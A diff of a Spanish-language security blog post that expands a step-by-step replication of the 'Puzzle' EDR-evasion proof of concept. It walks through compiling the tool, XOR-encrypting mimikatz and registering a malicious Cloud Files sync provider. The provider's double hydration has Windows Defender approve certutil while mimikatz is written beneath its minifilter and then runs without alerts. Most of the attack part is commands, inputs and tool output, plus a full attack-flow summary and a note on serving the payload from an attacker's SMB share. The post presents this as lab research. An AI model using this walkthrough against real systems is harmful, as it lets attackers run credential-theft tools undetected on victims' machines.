@@ -3,79 +3,175 @@ layout: single
 title: "Replicando Puzzle: evasión completa de EDR con Cloud Files y minifilters"
 date: 2026-06-22
 categories: [malware, tutoriales]
-tags: [edr-evasion, windows-kernel, minifilter, cldflt, bindflt, cloud-files, mimikatz, flare-vm, poc]
-excerpt: "Replicación del PoC de Kurosh Dabbagh (@kudaes) presentado en EuskalHack IX: doble hidratación via Cloud Files API para escribir malware en disco sin que el AV lo escanee. Mimikatz ejecutándose con Windows Defender activo."
+tags: [edr-evasion, windows-kernel, minifilter, cldflt, bindflt, cloud-files, mimikatz, flare-vm, poc, rust]
+excerpt: "Replicación paso a paso del PoC de Kurosh Dabbagh (@kudaes) presentado en EuskalHack IX: doble hidratación via Cloud Files API para escribir malware en disco sin que el AV lo escanee. Mimikatz ejecutándose con Windows Defender activo."
 permalink: /malware/puzzle-poc-edr-evasion-minifilters/
 header:
   og_image: /assets/images/og-preview.png
 ---
 
-Este post documenta la replicación del PoC [Puzzle](https://github.com/Kudaes/Puzzle) de Kurosh Dabbagh ([@kudaes](https://github.com/kudaes)), presentado en [EuskalHack IX](/conference/euskalhack-ix-minifilters-kernel/) en junio de 2026. El objetivo es entender la técnica a nivel práctico reproduciéndola en un entorno controlado (FLARE-VM con Windows Defender activo).
+Este post documenta la replicación del PoC [Puzzle](https://github.com/Kudaes/Puzzle) de Kurosh Dabbagh ([@kudaes](https://github.com/kudaes)), presentado en [EuskalHack IX](/conference/euskalhack-ix-minifilters-kernel/) en junio de 2026. El objetivo es entender la técnica a nivel práctico reproduciéndola en un entorno controlado con Windows Defender activo.
+
+Para el contexto teórico completo (arquitectura de minifilters, Cloud Files API, FRN, bindflt) ver el [post de la charla](/conference/euskalhack-ix-minifilters-kernel/).
 
 ## Entorno
 
 - **Sandbox:** FLARE-VM (Windows 10/11)
 - **Rust:** 1.96.0 / Cargo 1.96.0
-- **Windows Defender:** activo (sin exclusiones para el payload)
+- **Windows Defender:** activo durante todo el proceso
 - **Repo:** [github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle)
 
-Minifilters verificados con `fltmc` antes de empezar:
+---
 
-```
-bindflt    409800   ← por encima de todo
-WdFilter   328010   ← Windows Defender
-CldFlt     180451   ← Cloud Files (OneDrive/sync providers)
-Wof         40700
-```
+## Paso 1 — Instalar Rust
 
-Los tres necesarios están presentes. La altitud de CldFlt (180451) es la clave: está **por debajo** de WdFilter, lo que significa que las escrituras que hace `CldFlt` vía `FltWriteFileEx` no son visibles para Defender.
-
-## Compilar el PoC
+Puzzle está escrito en Rust. Si no está instalado, desde PowerShell:
 
 ```powershell
-# Desde C:\Users\Ramon\Downloads\Puzzle-main\
+Invoke-WebRequest -Uri https://win.rustup.rs -OutFile rustup-init.exe
+.\rustup-init.exe   # opción 1 (default)
+```
+
+También necesita **Visual Studio Build Tools** con el componente "Desktop development with C++". El instalador de Rust lo pedirá automáticamente si no están presentes.
+
+Verificación:
+
+```
+PS C:\Windows\system32> rustc.exe --version
+rustc 1.96.0 (ac68faa20 2026-05-25)
+
+PS C:\Windows\system32> cargo.exe --version
+cargo 1.96.0 (30a34c682 2026-05-25)
+```
+
+---
+
+## Paso 2 — Descargar y compilar Puzzle
+
+Descargar el repo como ZIP desde GitHub y extraer, o clonar con git:
+
+```powershell
+git clone https://github.com/Kudaes/Puzzle
+cd Puzzle
+```
+
+Compilar todos los binarios en modo release:
+
+```powershell
 build.cmd build release
 ```
 
-Binarios generados en `.\bin\`:
+`build.cmd` invoca `cargo build --release` sobre cada subcrate del repo. Los binarios compilados quedan en `.\bin\`:
 
 ```
-bindlinks.exe      (200 KB) — requiere Admin
-id_mapper.exe      (291 KB)
-sync_provider.exe  (260 KB)
-utils.exe          (220 KB)
-wof_provider.exe   (226 KB) — requiere Admin
+PS C:\Users\Ramon\Downloads\Puzzle-main\bin> ls
+
+Mode    Length  Name
+----    ------  ----
+-a----  200192  bindlinks.exe      ← crea bindlinks (requiere Admin)
+-a----  291840  id_mapper.exe      ← ejecuta por FRN sin ruta visible
+-a----  260096  sync_provider.exe  ← registra el Cloud Files provider malicioso
+-a----  220160  utils.exe
+-a----  226816  wof_provider.exe   ← alternativa con WIM (requiere Admin)
 ```
 
-## Preparar el payload
+---
 
-El sync provider acepta el payload cifrado con XOR simple. El script `Scripts/xor_file.py` del repo hace el cifrado:
+## Paso 3 — Verificar minifilters
+
+Antes de nada, confirmar que los tres minifilters necesarios están cargados:
 
 ```powershell
-python Scripts\xor_file.py `
+fltmc
+```
+
+```
+Nombre de filtro    Altitud    Trama
+-----------         --------   -----
+bindflt             409800     0     ← por encima de todo
+WdFilter            328010     0     ← Windows Defender
+storqosflt          244000     0
+wcifs               189900     0
+CldFlt              180451     0     ← Cloud Files (clave del ataque)
+FileCrypt           141100     0
+luafv               135000     0
+npsvctrig            46000     0
+Wof                  40700     0
+FileInfo             40500     0
+```
+
+Lo relevante:
+
+```
+bindflt    409800   ← intercepta antes que Defender
+WdFilter   328010   ← Defender escanea a esta altitud
+CldFlt     180451   ← escribe por DEBAJO de Defender → no visible para WdFilter
+```
+
+Los tres están presentes. El sistema es compatible.
+
+---
+
+## Paso 4 — Localizar el payload
+
+Para que la demo sea real, el payload tiene que ser algo que Defender detectaría normalmente. En FLARE-VM, mimikatz estaba disponible en Downloads:
+
+```
+C:\Users\Ramon\Downloads\mimikatz_trunk\x64\mimikatz.exe   (1.355.264 bytes)
+```
+
+---
+
+## Paso 5 — Cifrar el payload
+
+El sync provider acepta el payload cifrado con XOR. El script `Scripts/xor_file.py` del repo hace el cifrado. Esto es necesario porque el archivo cifrado (bytes XOR aleatorios, sin firma PE) es indetectable para Defender:
+
+```powershell
+python C:\Users\Ramon\Downloads\Puzzle-main\Scripts\xor_file.py `
   C:\Users\Ramon\Downloads\mimikatz_trunk\x64\mimikatz.exe `
   test1234 `
   C:\Temp\mimi.enc.bin
 ```
 
-El archivo cifrado (`mimi.enc.bin`) son bytes XOR — sin firma PE, sin estructura reconocible. Defender no puede detectarlo.
+Sintaxis del script: `xor_file.py <input> <key> <output>`.
 
-> **Nota:** En un escenario real el atacante genera el `.enc.bin` en su propia máquina y lo sirve vía SMB (`\\attacker\share\mimi.enc.bin`). La víctima nunca tiene el binario en claro en disco.
+El archivo resultante (`mimi.enc.bin`) tiene el mismo tamaño que el original (1.355.264 bytes) pero sin ninguna estructura PE reconocible — Defender no puede detectarlo.
 
-## Ejecutar el ataque
+> **En un ataque real** este paso lo hace el atacante en su propia máquina. El `.enc.bin` se sirve desde un share SMB remoto. La víctima nunca tiene el binario en claro en disco.
 
-**Paso 1 — Registrar el sync provider malicioso:**
+---
 
+## Paso 6 — Registrar el sync provider malicioso
+
+Crear el directorio de trabajo:
+
+```powershell
+mkdir C:\Temp\test
 ```
+
+Lanzar el sync provider (no requiere Admin):
+
+```powershell
+cd C:\Users\Ramon\Downloads\Puzzle-main\bin
 .\sync_provider.exe
-
-Sync root directory:   C:\Temp\test
-Backing file 1:        C:\Windows\System32\certutil.exe
-Backing file 2:        C:\Temp\mimi.enc.bin
-Placeholder name:      notmimi.exe
-Decryption key:        test1234
-Mode:                  2
 ```
+
+El binario pide 6 inputs interactivos:
+
+```
+Sync root directory:                  C:\Temp\test
+Backing file 1 (benign file):         C:\Windows\System32\certutil.exe
+Backing file 2 (payload):             C:\Temp\mimi.enc.bin
+Placeholder name:                     notmimi.exe
+Decryption key (empty = unencrypted): test1234
+Select mode (1 or 2):                 2
+```
+
+**Backing file 1** es el fichero legítimo que el provider entregará en la primera hidratación (el que Defender va a escanear y aprobar). Debe tener tamaño ≥ al del payload.
+
+**Backing file 2** es el payload cifrado. El provider lo descifrará en memoria antes de la segunda hidratación.
+
+**Mode 2** activa la doble hidratación: primero entrega goodware, luego reemplaza proactivamente con el malware en background. Mode 1 es hidratación simple sin evasión.
 
 Output:
 
@@ -84,9 +180,20 @@ Output:
 [+] Connection to sync root established. Connection key: 0x270044af320
 [+] Placeholder created: C:\Temp\test\notmimi.exe
 [+] Provider status set to CF_PROVIDER_STATUS_IDLE.
+-----------------------------------------------------
+[**] Select an option [**]
+1) Dehydrate Placeholder
+2) Unsync and Exit
+>
 ```
 
-**Paso 2 — Primera ejecución (Defender escanea → certutil → limpio):**
+El provider queda en espera. **Dejar esta ventana abierta.**
+
+---
+
+## Paso 7 — Primera ejecución (Defender escanea certutil)
+
+En una segunda ventana PowerShell:
 
 ```powershell
 C:\Temp\test\notmimi.exe
@@ -96,33 +203,35 @@ El provider registra la hidratación:
 
 ```
 [-] Fetch Data operation received:
+[-] Required offset: 0
 [-] Required length: 1700864
-[-] Bytes to send: 1700864          ← certutil.exe (1.7 MB)
+[-] Bytes to send: 1700864          ← entrega certutil.exe (1.7 MB)
+[-] Process command line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"' --- PID: 3656
 [-] Waiting 10 seconds before second hydration...
-[-] Starting second rehydration!    ← mimikatz escrito via FltWriteFileEx
+[-] Starting second rehydration!    ← escribe mimikatz sin que Defender lo vea
 [+] Process completed!
 ```
 
 Lo que ocurre internamente:
 
-1. Defender intercepta la creación de sección (`NtCreateSection`) para escanear el binario
-2. `CldFlt` detecta que el placeholder está deshidratado y pide al sync provider el contenido
-3. El provider entrega `certutil.exe` → Defender lo escanea → limpio ✓
-4. Diez segundos después, el provider **proactivamente** hace una segunda hidratación entregando mimikatz descifrado en memoria
-5. `CldFlt` escribe mimikatz a disco con `FltWriteFileEx` — esta escritura **no sube por encima de CldFlt**, por lo que WdFilter (Defender) nunca la ve
-6. El USN Journal y los metadatos del MFT **no registran** esta escritura como modificación (comportamiento documentado de `FLTFL_IO_OPERATION_PAGING`)
+1. `NtCreateSection` sobre el placeholder → `IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION`
+2. **Defender** intercepta primero (altitud 328010) y pide hidratación completa para escanear
+3. `CldFlt` pide el contenido al sync provider → provider entrega `certutil.exe`
+4. Defender escanea certutil → limpio ✓ → el proceso se lanza (certutil)
+5. Diez segundos después, el provider **proactivamente** hace la segunda hidratación: descifra `mimi.enc.bin` en memoria y llama a `FltWriteFileEx`
+6. `FltWriteFileEx` escribe mimikatz a disco **sin propagarlo hacia instancias de altitud superior** → WdFilter (328010 > 180451) no recibe la escritura → Defender no ve mimikatz en ningún momento
 
-**Paso 3 — Flush de caché y segunda ejecución:**
+---
 
-```powershell
-# Forzar que Windows descarte el contenido cacheado
-# Clic derecho → Propiedades → OK, o:
-(Get-Item C:\Temp\test\notmimi.exe).Attributes
-```
+## Paso 8 — Confirmar el contenido en disco y segunda ejecución
 
-El Properties confirma que el contenido en disco es ya mimikatz:
+Después de la segunda hidratación, `notmimi.exe` contiene mimikatz. Para confirmarlo y forzar que Windows descarte el caché del contenido anterior:
 
-{% include figure image_path="/assets/images/puzzle-poc-win.png" caption="Properties de notmimi.exe: 1.355.264 bytes = mimikatz. Defender no generó ninguna alerta." %}
+Clic derecho sobre `C:\Temp\test\notmimi.exe` → Propiedades → OK.
+
+{% include figure image_path="/assets/images/puzzle-poc-win.png" caption="Properties de notmimi.exe: 1.355.264 bytes — el tamaño exacto de mimikatz.exe. Defender no generó ninguna alerta." %}
+
+El tamaño **1,29 MB (1.355.264 bytes)** confirma que mimikatz está en disco: certutil.exe pesa ~1,7 MB, mimikatz pesa exactamente 1.355.264 bytes.
 
 Segunda ejecución:
 
@@ -130,35 +239,69 @@ Segunda ejecución:
 C:\Temp\test\notmimi.exe
 ```
 
-Mimikatz se ejecuta. **Windows Defender no genera ninguna alerta.**
+Se abre la ventana de mimikatz. **Windows Defender no genera ninguna alerta.**
 
-## Por qué funciona
+---
+
+## Por qué el AV no detecta la segunda ejecución
+
+En la segunda ejecución, Defender consulta:
 
 ```
-Defender consulta en la segunda ejecución:
-  → USN Journal: sin modificaciones desde el último escaneo
-  → MFT metadata: sin cambios de timestamp
-  → Conclusión: "el fichero no ha cambiado, ya lo aprobé" → ejecuta sin re-análisis
-
-CldFlt escribió mimikatz sin que Defender lo viera porque:
-  → FltWriteFileEx no propaga la escritura hacia instancias de altitud superior
-  → WdFilter (328010) > CldFlt (180451) → Defender es "superior" → no recibe la escritura
+USN Journal      → sin cambios registrados desde el último escaneo
+MFT metadata     → sin modificación de timestamps
+Conclusión:      → "el fichero no ha cambiado, ya lo aprobé" → ejecuta sin re-análisis
 ```
 
-## Limpieza
+`CldFlt` no registra las escrituras realizadas con `FltWriteFileEx` + `FLTFL_IO_OPERATION_PAGING` en el USN Journal ni en los metadatos del MFT. Desde el punto de vista de Defender, el fichero es el mismo certutil.exe que aprobó en el escaneo anterior.
+
+---
+
+## Paso 9 — Limpieza
+
+En la consola del sync provider:
+
+```
+1   → Dehydrate Placeholder
+2   → Unsync and Exit
+```
 
 ```powershell
-# En la consola del sync_provider:
-# 1 → Dehydrate
-# 2 → Unsync and Exit
-
 Remove-Item C:\Temp\test -Recurse -Force
 Remove-Item C:\Temp\mimi.enc.bin
 ```
 
+---
+
+## Resumen del flujo completo
+
+```
+[Atacante - máquina propia]
+mimikatz.exe → xor_file.py → mimi.enc.bin
+                              ↓ (SMB / disco)
+[Víctima - Defender activo]
+sync_provider.exe registrado como Cloud Files provider
+placeholder notmimi.exe creado en C:\Temp\test\
+
+Primera ejecución de notmimi.exe:
+  → Defender pide hidratación
+  → provider entrega certutil.exe → Defender: limpio ✓
+  → (background) provider escribe mimikatz via FltWriteFileEx
+     por debajo de WdFilter → Defender no lo ve
+     USN Journal no registra la escritura
+
+Segunda ejecución de notmimi.exe:
+  → Defender: "sin cambios desde el último escaneo" → no re-analiza
+  → mimikatz.exe ejecutándose ✓
+  → Windows Defender: sin alertas ✓
+```
+
+---
+
 ## Referencias
 
-- [EuskalHack IX — Minifilters: Owning the High (and Low) Ground](/conference/euskalhack-ix-minifilters-kernel/) — notas técnicas de la charla
-- [Puzzle — github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle) — repo de Kurosh Dabbagh
+- [EuskalHack IX — Minifilters: Owning the High (and Low) Ground](/conference/euskalhack-ix-minifilters-kernel/) — análisis técnico de la charla de Dabbagh
+- [Puzzle — github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle) — repositorio de Kurosh Dabbagh (@kudaes)
 - [Cloud Filter API — Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/)
 - [FltWriteFileEx — Microsoft Docs](https://learn.microsoft.com/es-es/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltwritefileex)
+- [Load order groups and altitudes — Microsoft Docs](https://learn.microsoft.com/es-es/windows-hardware/drivers/ifs/load-order-groups-and-altitudes-for-minifilter-drivers)
